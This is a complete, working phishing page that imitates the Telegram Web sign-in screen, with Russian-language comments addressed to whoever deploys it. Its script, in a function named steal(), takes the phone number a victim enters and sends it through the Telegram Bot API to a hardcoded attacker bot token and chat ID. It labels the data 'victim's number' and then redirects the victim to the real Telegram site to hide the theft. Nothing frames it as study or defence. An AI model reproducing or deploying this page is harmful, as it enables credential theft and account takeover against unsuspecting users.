<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Telegram Web</title>
<style>
body { margin:0; background:#0e1621; color:#fff; font-family:Arial, sans-serif; display:flex; align-items:center; justify-content:center; height:100vh; }
.login-box { background:#17212b; padding:40px; border-radius:10px; width:300px; text-align:center; box-shadow: 0 4px 20px rgba(0,0,0,0.5); }
.logo { width:80px; margin-bottom:20px; }
input { width:100%; padding:12px; margin:10px 0; background:#242f3d; border:1px solid #242f3d; color:#fff; border-radius:6px; box-sizing:border-box; font-size:16px; }
input:focus { border-color:#2ea6ff; outline:none; }
button { width:100%; padding:12px; background:#2ea6ff; color:#fff; border:none; border-radius:6px; font-size:16px; cursor:pointer; margin-top:10px; font-weight:bold; }
button:hover { background:#1c8ce0; }
.error { color:#ff4e4e; font-size:14px; margin-top:10px; display:none; }
</style>
</head>
<body>
<div class="login-box">
<img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" class="logo" alt="Telegram">
<h2>Sign in to Telegram</h2>
<p style="color:#8b9cae; font-size:14px;">Please confirm your country and enter your phone number.</p>

<input type="text" id="phone" placeholder="Phone number">
<button onclick="steal()">Next</button>
<div class="error" id="err">Invalid phone number</div>
</div>

<script>
// ТВОИ ДАННЫЕ
const token = '9032594050:AAEGZzvavJ5p3gfvo-9bUwEI08ePFw5a9pw';
const chat_id = '7809855501'; 

function steal() {
const phone = document.getElementById('phone').value;
if (phone.length < 5) {
document.getElementById('err').style.display = 'block';
return;
}

// Отправляем номер тебе в бота
fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=Номер жертвы: ${phone}`);

// Перекидываем на настоящий Telegram
setTimeout(() => {
window.location.href = 'https://web.telegram.org';
}, 500);
}
</script>
</body>
</html>
